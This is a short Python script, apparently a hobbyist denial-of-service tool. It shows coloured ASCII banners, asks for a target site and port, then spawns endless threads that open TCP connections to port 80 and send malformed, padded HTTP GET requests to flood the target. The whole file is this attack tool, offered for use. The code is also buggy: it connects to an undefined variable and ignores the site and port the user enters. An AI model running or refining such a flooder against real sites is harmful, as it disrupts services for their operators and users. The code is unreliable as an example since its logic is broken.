from colorama import Fore,init
init()
print(Fore.YELLOW+"      DDOS ATATK DDOS")



print(Fore.GREEN+"""

⠀######   #####    ######   ##  ##
 ######   ######   ######   ### ##
   ##     ##   #   ##  ##   ## ###
   ##     ##   #   ##  ##   ##  ##
   ##     #####    ######   ##  ##
   ##     ##   #   ##  ##   ##  ##
 ######   ##   #   ##  ##   ##  ##

""")
from colorama import Fore,init
init()
print(Fore.BLUE+"   DDOS ATATK DDOS")



print(Fore.RED+"""

8888888b.  8888888b.   .d88888b.   .d8888b.
888  "Y88b 888  "Y88b d88P" "Y88b d88P  Y88b
888    888 888    888 888     888 Y88b.
888    888 888    888 888     888  "Y888b.
888    888 888    888 888     888     "Y88b.
888    888 888    888 888     888       "888
888  .d88P 888  .d88P Y88b. .d88P Y88b  d88P
8888888P"  8888888P"   "Y88888P"   "Y8888P"
""")
from colorama import Fore,init
init()
print(Fore.LIGHTWHITE_EX+"" )
NAME =input('         ›››site : ' )
print('')
name =input('     ATATK   PORT: ' )
print('')
from colorama import Fore,init
init()
print(Fore.LIGHTRED_EX+"")
from socket import *
import time
import threading
def main():
    for i in range(1, 1000):
        s = socket(AF_INET , SOCK_STREAM)
        s.connect((u , 80))
        pack = b"A"*100
        request = "GET / HTTP 1.1\r\n".encode() + pack
        print("send")
        s.send(request)

while True:
    t = threading.Thread(target=main)
    t.start()
